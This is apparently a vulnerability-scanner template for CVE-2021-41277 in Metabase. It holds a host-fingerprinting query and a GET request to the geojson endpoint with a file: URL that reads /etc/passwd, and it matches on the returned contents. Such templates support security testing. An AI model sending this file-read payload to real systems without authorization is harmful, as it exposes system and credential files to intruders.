name: Metabase Geojson Arbitrary File Read CVE-2021-41277
manual: true
query: app="Metabase" || title="Metabase" || body="Metabase"
transport: http
rules:
  r0:
    request:
      method: GET
      path: /api/geojson?url=file:/etc/passwd
    expression: response.status == 200 && response.body.bcontains(b"/root:/bin/ash")
expression: r0()
detail:
  links:
  - https://nvd.nist.gov/vuln/detail/CVE-2021-41277
  - https://twitter.com/90security/status/1461923313819832324
  - https://mp.weixin.qq.com/s?__biz=Mzg3NDU2MTg0Ng==&mid=2247486238&idx=1&sn=0eea83880942b16975335739e1db5aa2
  description: Metabase is an open source business intelligence tool.
  tags: fileread
